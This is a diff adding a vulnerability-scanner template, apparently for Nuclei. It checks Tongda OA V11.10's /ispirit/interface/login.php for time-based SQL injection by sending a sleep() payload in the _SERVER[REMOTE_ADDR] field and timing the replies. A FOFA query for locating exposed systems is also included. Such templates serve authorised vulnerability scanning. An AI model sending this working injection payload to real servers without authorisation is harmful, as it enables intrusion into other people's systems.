@@ -1,0 +1,49 @@
+id: poc-yaml-tongda-oa-login-sqli
+
+info:
+  name: 通达OA V11.10接口login.php存在SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 通达OA
+    fofa: app="TDXK-通达OA"
+
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /ispirit/interface/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d1,sleep({{t1}}),(select+~0%2b1))+limit+0,1))--+'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "请联系管理员") || contains(body, "文件")
+          - duration >= {{t1}}
+          - duration <= {{t2}}
+
+  - raw:
+      - |
+        POST /ispirit/interface/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d1,sleep({{t3}}),(select+~0%2b1))+limit+0,1))--+'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "请联系管理员") || contains(body, "文件")
+          - duration >= {{t3}}
+          - duration <= {{t4}}
